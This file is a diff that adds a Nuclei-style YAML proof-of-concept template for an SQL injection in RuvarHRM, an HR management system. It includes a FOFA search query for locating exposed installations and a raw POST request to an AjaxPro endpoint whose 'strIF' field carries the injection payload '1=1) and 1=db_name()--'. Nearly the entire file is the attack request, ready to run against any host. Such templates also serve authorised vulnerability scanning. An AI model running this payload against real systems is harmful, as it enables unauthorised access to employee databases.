@@ -1,0 +1,30 @@
+id: poc-ietrfawrekq228vu
+info:
+  name: 璐华RuvarHRM存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ietrfawrekq228vu'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ietrfawrekq228vu
+    fofa: title="RuvarHRM" || body="src=\"/RuvarHRM/web_login/login.aspx"
+http:
+- raw:
+  - 'POST /ajaxpro/RuvarHRM.Web.Common.get_account_by_tree,RuvarHRM.Web.Common.ashx HTTP/1.1
+
+    Content-Type: application/json
+
+    Host: {{Hostname}}
+
+    X-AjaxPro-Method:SearchUsers
+
+    User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/59.0.354.94 Safari/537.36
+
+
+    {"strIF":"1=1) and 1=db_name()--","deptPv":"0","strUserType":"all"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
